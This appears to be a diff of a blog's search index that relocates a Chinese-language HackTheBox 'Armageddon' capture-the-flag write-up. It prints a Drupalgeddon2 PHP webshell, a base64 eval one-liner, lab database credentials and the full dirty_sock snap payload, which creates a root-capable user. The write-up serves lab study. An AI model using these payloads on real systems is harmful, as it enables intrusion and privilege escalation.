@@ -1,122 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hackthebox-Armageddon</title>
-    <url>/2022/01/07/HackTheBox-Armageddon/</url>
-    <content><![CDATA[<h1 id="Hackthebox-Armageddon"><a href="#Hackthebox-Armageddon" class="headerlink" title="Hackthebox-Armageddon"></a>Hackthebox-Armageddon</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Armg_pwn.png" alt="pwn"></p>
-<span id="more"></span>
-
-<blockquote>
-<p>目标IP：10.10.10.233</p>
-<p>本机IP：10.10.14.209</p>
-</blockquote>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Armageddon_nmap.png" alt="nmap"></p>
-<p>开放了22、80端口</p>
-<p>打开Burpsuite，配置好代理（个人习惯，F12一样的）</p>
-<p>直接访问看下网站功能</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/webserver.png" alt="webserver"></p>
-<p>没什么特别的功能，注册一个账号试试</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/failregister.png" alt="failregister"></p>
-<p>输入账号邮箱以后密码发到邮箱里，但这个功能应该是假的，没有收到任何邮件</p>
-<p>简单尝试了一下似乎也没有sql注入</p>
-<p><strong>Dirsearch</strong></p>
-<p>扫了一下网站目录，发现了<code>robots.txt</code>、<code>shell.php</code>等</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dirsearch.png" alt="dirsearch"></p>
-<p>查看下<code>robots.txt</code>里面都有什么</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># CSS, JS, Images</span><br><span class="line">Allow: /misc/*.css$</span><br><span class="line">Allow: /misc/*.css?</span><br><span class="line">Allow: /misc/*.js$</span><br><span class="line">Allow: /misc/*.js?</span><br><span class="line">Allow: /misc/*.gif</span><br><span class="line">Allow: /misc/*.jpg</span><br><span class="line">Allow: /misc/*.jpeg</span><br><span class="line">Allow: /misc/*.png</span><br><span class="line">Allow: /modules/*.css$</span><br><span class="line">Allow: /modules/*.css?</span><br><span class="line">Allow: /modules/*.js$</span><br><span class="line">Allow: /modules/*.js?</span><br><span class="line">Allow: /modules/*.gif</span><br><span class="line">Allow: /modules/*.jpg</span><br><span class="line">Allow: /modules/*.jpeg</span><br><span class="line">Allow: /modules/*.png</span><br><span class="line">Allow: /profiles/*.css$</span><br><span class="line">Allow: /profiles/*.css?</span><br><span class="line">Allow: /profiles/*.js$</span><br><span class="line">Allow: /profiles/*.js?</span><br><span class="line">Allow: /profiles/*.gif</span><br><span class="line">Allow: /profiles/*.jpg</span><br><span class="line">Allow: /profiles/*.jpeg</span><br><span class="line">Allow: /profiles/*.png</span><br><span class="line">Allow: /themes/*.css$</span><br><span class="line">Allow: /themes/*.css?</span><br><span class="line">Allow: /themes/*.js$</span><br><span class="line">Allow: /themes/*.js?</span><br><span class="line">Allow: /themes/*.gif</span><br><span class="line">Allow: /themes/*.jpg</span><br><span class="line">Allow: /themes/*.jpeg</span><br><span class="line">Allow: /themes/*.png</span><br><span class="line"># Directories</span><br><span class="line">Disallow: /includes/</span><br><span class="line">Disallow: /misc/</span><br><span class="line">Disallow: /modules/</span><br><span class="line">Disallow: /profiles/</span><br><span class="line">Disallow: /scripts/</span><br><span class="line">Disallow: /themes/</span><br><span class="line"># Files</span><br><span class="line">Disallow: /CHANGELOG.txt</span><br><span class="line">Disallow: /cron.php</span><br><span class="line">Disallow: /INSTALL.mysql.txt</span><br><span class="line">Disallow: /INSTALL.pgsql.txt</span><br><span class="line">Disallow: /INSTALL.sqlite.txt</span><br><span class="line">Disallow: /install.php</span><br><span class="line">Disallow: /INSTALL.txt</span><br><span class="line">Disallow: /LICENSE.txt</span><br><span class="line">Disallow: /MAINTAINERS.txt</span><br><span class="line">Disallow: /update.php</span><br><span class="line">Disallow: /UPGRADE.txt</span><br><span class="line">Disallow: /xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: /admin/</span><br><span class="line">Disallow: /comment/reply/</span><br><span class="line">Disallow: /filter/tips/</span><br><span class="line">Disallow: /node/add/</span><br><span class="line">Disallow: /search/</span><br><span class="line">Disallow: /user/register/</span><br><span class="line">Disallow: /user/password/</span><br><span class="line">Disallow: /user/login/</span><br><span class="line">Disallow: /user/logout/</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: /?q=admin/</span><br><span class="line">Disallow: /?q=comment/reply/</span><br><span class="line">Disallow: /?q=filter/tips/</span><br><span class="line">Disallow: /?q=node/add/</span><br><span class="line">Disallow: /?q=search/</span><br><span class="line">Disallow: /?q=user/password/</span><br><span class="line">Disallow: /?q=user/register/</span><br><span class="line">Disallow: /?q=user/login/</span><br><span class="line">Disallow: /?q=user/logout/</span><br></pre></td></tr></table></figure>
-
-<p>网站居然没有任何限制，可以直接看目录</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E7%9B%AE%E5%BD%95.png" alt="目录"></p>
-<p>几个目录都翻烂了也没啥有用的信息</p>
-<p>在更新日志(/CHANGELOG.txt)里发现了重要信息</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/changelog.png" alt="changelog"></p>
-<p>从更新日志里可以看到，网站最后更新的Drupal 7.56</p>
-<p>Google上搜了一波得知Drupal 7.56爆出过远程代码执行漏洞，影响范围<strong>Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1</strong></p>
-<h2 id="Drupal远程代码执行漏洞利用"><a href="#Drupal远程代码执行漏洞利用" class="headerlink" title="Drupal远程代码执行漏洞利用"></a>Drupal远程代码执行漏洞利用</h2><p>详情可搜CVE：2018-7600，分析文章已经很多了不多赘述（Exp在参考链接）</p>
-<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><strong>–部分Drupalgeddon2代码–</strong></p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Settings - Try to write a PHP to the web root?</span></span><br><span class="line">try_phpshell = <span class="literal">true</span></span><br><span class="line"><span class="comment"># Settings - General/Stealth</span></span><br><span class="line"><span class="variable">$useragent</span> = <span class="string">&quot;drupalgeddon2&quot;</span></span><br><span class="line">webshell = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="comment"># Settings - Proxy information (nil to disable)</span></span><br><span class="line"><span class="variable">$proxy_addr</span> = <span class="literal">nil</span></span><br><span class="line"><span class="variable">$proxy_port</span> = <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is &#x27;better&#x27;!)</span></span><br><span class="line">bashcmd = <span class="string">&quot;&lt;?php if( isset( $_REQUEST[&#x27;c&#x27;] ) ) &#123; system( $_REQUEST[&#x27;c&#x27;] . &#x27; 2&gt;&amp;1&#x27; ); &#125;&quot;</span></span><br><span class="line">bashcmd = <span class="string">&quot;echo &quot;</span> + Base64.strict_encode64(bashcmd) + <span class="string">&quot; | base64 -d&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>上面Dirsearch扫描发现就有个<code>shell.php</code>，应该是别的gamer在做靶机的时候写进来的，尝试下果然</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/shellphp.png" alt="shellphp"></p>
-<p>利用<code>shell.php</code>入自己的一句话并用蚁剑连接(想弹个shell出来发现弹不出来，可能姿势不对)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4K|base64 -d &gt;jasontt.php</span><br></pre></td></tr></table></figure>
-
-<p>蚁剑成功连接</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E8%9A%81%E5%89%91.png" alt="蚁剑"></p>
-<p>根目录下没有user.txt，那应该不在当前用户下</p>
-<p>终于<code>/var/www/html/sites/default/settings.php</code>里发现了数据库的用户名密码</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/settings.png" alt="settings"></p>
-<pre><code>  &#39;username&#39; =&gt; &#39;drupaluser&#39;,
-  &#39;password&#39; =&gt; &#39;CQHEy@9M*m23gBVj&#39;,
-</code></pre>
-<p>接下来利用找到的数据库账号密码从数据库中找到有用的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -e &#x27;show databases;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/databases.png" alt="databases"></p>
-<p>查看<code>drupal</code>中有哪些表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#x27;show tables;&#x27;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tables_in_drupal</span><br><span class="line">actions</span><br><span class="line">authmap</span><br><span class="line">batch</span><br><span class="line">block</span><br><span class="line">block_custom</span><br><span class="line">block_node_type</span><br><span class="line">block_role</span><br><span class="line">blocked_ips</span><br><span class="line">cache</span><br><span class="line">cache_block</span><br><span class="line">cache_bootstrap</span><br><span class="line">cache_field</span><br><span class="line">cache_filter</span><br><span class="line">cache_form</span><br><span class="line">cache_image</span><br><span class="line">cache_menu</span><br><span class="line">cache_page</span><br><span class="line">cache_path</span><br><span class="line">comment</span><br><span class="line">date_format_locale</span><br><span class="line">date_format_type</span><br><span class="line">date_formats</span><br><span class="line">field_config</span><br><span class="line">field_config_instance</span><br><span class="line">field_data_body</span><br><span class="line">field_data_comment_body</span><br><span class="line">field_data_field_image</span><br><span class="line">field_data_field_tags</span><br><span class="line">field_revision_body</span><br><span class="line">field_revision_comment_body</span><br><span class="line">field_revision_field_image</span><br><span class="line">field_revision_field_tags</span><br><span class="line">file_managed</span><br><span class="line">file_usage</span><br><span class="line">filter</span><br><span class="line">filter_format</span><br><span class="line">flood</span><br><span class="line">history</span><br><span class="line">image_effects</span><br><span class="line">image_styles</span><br><span class="line">menu_custom</span><br><span class="line">menu_links</span><br><span class="line">menu_router</span><br><span class="line">node</span><br><span class="line">node_access</span><br><span class="line">node_comment_statistics</span><br><span class="line">node_revision</span><br><span class="line">node_type</span><br><span class="line">queue</span><br><span class="line">rdf_mapping</span><br><span class="line">registry</span><br><span class="line">registry_file</span><br><span class="line">role</span><br><span class="line">role_permission</span><br><span class="line">search_dataset</span><br><span class="line">search_index</span><br><span class="line">search_node_links</span><br><span class="line">search_total</span><br><span class="line">semaphore</span><br><span class="line">sequences</span><br><span class="line">sessions</span><br><span class="line">shortcut_set</span><br><span class="line">shortcut_set_users</span><br><span class="line">system</span><br><span class="line">taxonomy_index</span><br><span class="line">taxonomy_term_data</span><br><span class="line">taxonomy_term_hierarchy</span><br><span class="line">taxonomy_vocabulary</span><br><span class="line">url_alias</span><br><span class="line">users</span><br><span class="line">users_roles</span><br><span class="line">variable</span><br><span class="line">watchdog</span><br></pre></td></tr></table></figure>
-
-<p>查看<code>users</code>表中有哪些字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#x27;desc users;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/desctables.png" alt="desctables"></p>
-<p><strong>name</strong>和<strong>pass</strong>应该就是账号密码了，查看一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#x27;select name,pass from users;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userpwd.png" alt="userpwd"></p>
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>除了利用网上找到的Exp也可以使用工具Metasploit</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/msf1.png" alt="msf1"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/msf2.png" alt="msf2"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/msf3.png" alt="msf3"></p>
-<p>getshell以后操作和方法一差不多就不继续写了，可以参考上面的。</p>
-<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>在数据库里得到了brucetherealadmin用户的账号密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brucetherealadmin   $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt</span><br></pre></td></tr></table></figure>
-
-<p>密码应该是hash加密过了，用Kali里自带的工具<code>john the ripper</code>破解</p>
-<p>新建一个txt文档存放密码，john命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash.txt -w /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/johnpass.png" alt="johnpass"></p>
-<p>得到密码为<code>booboo</code></p>
-<p>尝试刚得到的用户名密码<code>SSH</code>，连接成功</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/sshuser.png" alt="sshuser"></p>
-<p>user.txt在<code>~</code>目录下</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userflag.png" alt="userflag"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用<code>sudo -l</code>查看用户的权限</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/usersudo.png" alt="usersudo"></p>
-<p>直接google搜索<code>(root) NOPASSWD: /usr/bin/snap install *</code></p>
-<p>得到有用的信息<a href="https://github.com/initstring/dirty_sock/">dirty_sock:Linux提权漏洞</a>（snap漏洞分析参考链接2）</p>
-<blockquote>
-<p>2019年1月，由于默认安装的服务snapd API中的一个bug，通过默认安装的Ubuntu Linux被发现存在特权提升漏洞，任何本地用户都可以利用此漏洞直接获取root权限。</p>
-</blockquote>
-<p>通过<code>python --version</code>发现本地是python2，本台靶机用<code>dirty_sockv2.py</code>中的一部分就可以提权了</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dirtysock.png" alt="dirtysock"></p>
-<p>snap本身运行在沙箱环境中，exp通过snap的开发模式（“devmode”）来降低限制条件，从而像主机上的其他应用一样来访问主机。snap还引入了“hooks”机制，“install hook”会在snap安装时运行，如果snap配置为开发模式，hook将会在root上下文中运行</p>
-<p>脚本作用就是添加了一个<code>dirty_sock</code>用户可以提权到root</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -c &#x27;print &quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot; + &quot;A&quot;*4256 + &quot;==&quot;&#x27; | base64 -d &gt; jasontt.snap</span><br></pre></td></tr></table></figure>
-
-<p>安装jasont.snap</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /user/bin/snap install --devmode jasontt.snap</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/snap.png" alt="snap"></p>
-<p>用<code>cat /etc/passwd</code>看看<code>dirty_sock</code>用户有没有添加成功</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/adduser.png" alt="adduser"></p>
-<p>用户添加成功了，我们用<code>su</code>命令切换到<code>sock_dirty</code>用户，密码同用户名</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/drty_sock.png" alt="drty_sock"></p>
-<p>得到root权限，拿到root.txt</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/root.png" alt="root"></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.exploit-db.com/exploits/44449">https://www.exploit-db.com/exploits/44449</a></p>
-<p><a href="https://initblog.com/2019/dirty-sock/">https://initblog.com/2019/dirty-sock/</a></p>
-<p><a href="https://github.com/initstring/dirty_sock">https://github.com/initstring/dirty_sock</a></p>
-]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HACKthebox-Cap</title>
     <url>/2022/01/07/HackTheBox-Cap/</url>
     <content><![CDATA[<h1 id="HackTheBox-Cap"><a href="#HackTheBox-Cap" class="headerlink" title="HackTheBox-Cap"></a>HackTheBox-Cap</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/cap_pwn.png" alt="cap_pwn"></p>
@@ -209,7 +93,7 @@
 <p>dnsalias.htb</p>
 <p>dynamicdns.htb</p>
 <p>no-ip.htb</p>
-<p>dyna.htb(由网页底部<a href="mailto:&#x64;&#110;&#115;&#x40;&#100;&#121;&#110;&#x61;&#x2e;&#x68;&#116;&#98;">&#x64;&#110;&#115;&#x40;&#100;&#121;&#110;&#x61;&#x2e;&#x68;&#116;&#98;</a>获得)</p>
+<p>dyna.htb(由网页底部<a href="mailto:&#100;&#110;&#x73;&#64;&#100;&#121;&#110;&#x61;&#x2e;&#x68;&#x74;&#x62;">&#100;&#110;&#x73;&#64;&#100;&#121;&#110;&#x61;&#x2e;&#x68;&#x74;&#x62;</a>获得)</p>
 </blockquote>
 <p>Beta中说网站正在测试模式下运行，并提供了共享凭据：</p>
 <blockquote>
@@ -371,6 +255,122 @@
 <p>成功保留了s权限，可以得到root了</p>
 <p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/getroot.png" alt="getroot"></p>
 <p>end</p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hackthebox-Armageddon</title>
+    <url>/2022/01/07/HackTheBox-Armageddon/</url>
+    <content><![CDATA[<h1 id="Hackthebox-Armageddon"><a href="#Hackthebox-Armageddon" class="headerlink" title="Hackthebox-Armageddon"></a>Hackthebox-Armageddon</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Armg_pwn.png" alt="pwn"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>目标IP：10.10.10.233</p>
+<p>本机IP：10.10.14.209</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Armageddon_nmap.png" alt="nmap"></p>
+<p>开放了22、80端口</p>
+<p>打开Burpsuite，配置好代理（个人习惯，F12一样的）</p>
+<p>直接访问看下网站功能</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/webserver.png" alt="webserver"></p>
+<p>没什么特别的功能，注册一个账号试试</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/failregister.png" alt="failregister"></p>
+<p>输入账号邮箱以后密码发到邮箱里，但这个功能应该是假的，没有收到任何邮件</p>
+<p>简单尝试了一下似乎也没有sql注入</p>
+<p><strong>Dirsearch</strong></p>
+<p>扫了一下网站目录，发现了<code>robots.txt</code>、<code>shell.php</code>等</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dirsearch.png" alt="dirsearch"></p>
+<p>查看下<code>robots.txt</code>里面都有什么</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># CSS, JS, Images</span><br><span class="line">Allow: /misc/*.css$</span><br><span class="line">Allow: /misc/*.css?</span><br><span class="line">Allow: /misc/*.js$</span><br><span class="line">Allow: /misc/*.js?</span><br><span class="line">Allow: /misc/*.gif</span><br><span class="line">Allow: /misc/*.jpg</span><br><span class="line">Allow: /misc/*.jpeg</span><br><span class="line">Allow: /misc/*.png</span><br><span class="line">Allow: /modules/*.css$</span><br><span class="line">Allow: /modules/*.css?</span><br><span class="line">Allow: /modules/*.js$</span><br><span class="line">Allow: /modules/*.js?</span><br><span class="line">Allow: /modules/*.gif</span><br><span class="line">Allow: /modules/*.jpg</span><br><span class="line">Allow: /modules/*.jpeg</span><br><span class="line">Allow: /modules/*.png</span><br><span class="line">Allow: /profiles/*.css$</span><br><span class="line">Allow: /profiles/*.css?</span><br><span class="line">Allow: /profiles/*.js$</span><br><span class="line">Allow: /profiles/*.js?</span><br><span class="line">Allow: /profiles/*.gif</span><br><span class="line">Allow: /profiles/*.jpg</span><br><span class="line">Allow: /profiles/*.jpeg</span><br><span class="line">Allow: /profiles/*.png</span><br><span class="line">Allow: /themes/*.css$</span><br><span class="line">Allow: /themes/*.css?</span><br><span class="line">Allow: /themes/*.js$</span><br><span class="line">Allow: /themes/*.js?</span><br><span class="line">Allow: /themes/*.gif</span><br><span class="line">Allow: /themes/*.jpg</span><br><span class="line">Allow: /themes/*.jpeg</span><br><span class="line">Allow: /themes/*.png</span><br><span class="line"># Directories</span><br><span class="line">Disallow: /includes/</span><br><span class="line">Disallow: /misc/</span><br><span class="line">Disallow: /modules/</span><br><span class="line">Disallow: /profiles/</span><br><span class="line">Disallow: /scripts/</span><br><span class="line">Disallow: /themes/</span><br><span class="line"># Files</span><br><span class="line">Disallow: /CHANGELOG.txt</span><br><span class="line">Disallow: /cron.php</span><br><span class="line">Disallow: /INSTALL.mysql.txt</span><br><span class="line">Disallow: /INSTALL.pgsql.txt</span><br><span class="line">Disallow: /INSTALL.sqlite.txt</span><br><span class="line">Disallow: /install.php</span><br><span class="line">Disallow: /INSTALL.txt</span><br><span class="line">Disallow: /LICENSE.txt</span><br><span class="line">Disallow: /MAINTAINERS.txt</span><br><span class="line">Disallow: /update.php</span><br><span class="line">Disallow: /UPGRADE.txt</span><br><span class="line">Disallow: /xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: /admin/</span><br><span class="line">Disallow: /comment/reply/</span><br><span class="line">Disallow: /filter/tips/</span><br><span class="line">Disallow: /node/add/</span><br><span class="line">Disallow: /search/</span><br><span class="line">Disallow: /user/register/</span><br><span class="line">Disallow: /user/password/</span><br><span class="line">Disallow: /user/login/</span><br><span class="line">Disallow: /user/logout/</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: /?q=admin/</span><br><span class="line">Disallow: /?q=comment/reply/</span><br><span class="line">Disallow: /?q=filter/tips/</span><br><span class="line">Disallow: /?q=node/add/</span><br><span class="line">Disallow: /?q=search/</span><br><span class="line">Disallow: /?q=user/password/</span><br><span class="line">Disallow: /?q=user/register/</span><br><span class="line">Disallow: /?q=user/login/</span><br><span class="line">Disallow: /?q=user/logout/</span><br></pre></td></tr></table></figure>
+
+<p>网站居然没有任何限制，可以直接看目录</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E7%9B%AE%E5%BD%95.png" alt="目录"></p>
+<p>几个目录都翻烂了也没啥有用的信息</p>
+<p>在更新日志(/CHANGELOG.txt)里发现了重要信息</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/changelog.png" alt="changelog"></p>
+<p>从更新日志里可以看到，网站最后更新的Drupal 7.56</p>
+<p>Google上搜了一波得知Drupal 7.56爆出过远程代码执行漏洞，影响范围<strong>Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1</strong></p>
+<h2 id="Drupal远程代码执行漏洞利用"><a href="#Drupal远程代码执行漏洞利用" class="headerlink" title="Drupal远程代码执行漏洞利用"></a>Drupal远程代码执行漏洞利用</h2><p>详情可搜CVE：2018-7600，分析文章已经很多了不多赘述（Exp在参考链接）</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><strong>–部分Drupalgeddon2代码–</strong></p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Settings - Try to write a PHP to the web root?</span></span><br><span class="line">try_phpshell = <span class="literal">true</span></span><br><span class="line"><span class="comment"># Settings - General/Stealth</span></span><br><span class="line"><span class="variable">$useragent</span> = <span class="string">&quot;drupalgeddon2&quot;</span></span><br><span class="line">webshell = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line"><span class="comment"># Settings - Proxy information (nil to disable)</span></span><br><span class="line"><span class="variable">$proxy_addr</span> = <span class="literal">nil</span></span><br><span class="line"><span class="variable">$proxy_port</span> = <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is &#x27;better&#x27;!)</span></span><br><span class="line">bashcmd = <span class="string">&quot;&lt;?php if( isset( $_REQUEST[&#x27;c&#x27;] ) ) &#123; system( $_REQUEST[&#x27;c&#x27;] . &#x27; 2&gt;&amp;1&#x27; ); &#125;&quot;</span></span><br><span class="line">bashcmd = <span class="string">&quot;echo &quot;</span> + Base64.strict_encode64(bashcmd) + <span class="string">&quot; | base64 -d&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面Dirsearch扫描发现就有个<code>shell.php</code>，应该是别的gamer在做靶机的时候写进来的，尝试下果然</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/shellphp.png" alt="shellphp"></p>
+<p>利用<code>shell.php</code>入自己的一句话并用蚁剑连接(想弹个shell出来发现弹不出来，可能姿势不对)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4K|base64 -d &gt;jasontt.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑成功连接</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E8%9A%81%E5%89%91.png" alt="蚁剑"></p>
+<p>根目录下没有user.txt，那应该不在当前用户下</p>
+<p>终于<code>/var/www/html/sites/default/settings.php</code>里发现了数据库的用户名密码</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/settings.png" alt="settings"></p>
+<pre><code>  &#39;username&#39; =&gt; &#39;drupaluser&#39;,
+  &#39;password&#39; =&gt; &#39;CQHEy@9M*m23gBVj&#39;,
+</code></pre>
+<p>接下来利用找到的数据库账号密码从数据库中找到有用的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -e &#x27;show databases;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/databases.png" alt="databases"></p>
+<p>查看<code>drupal</code>中有哪些表</p>
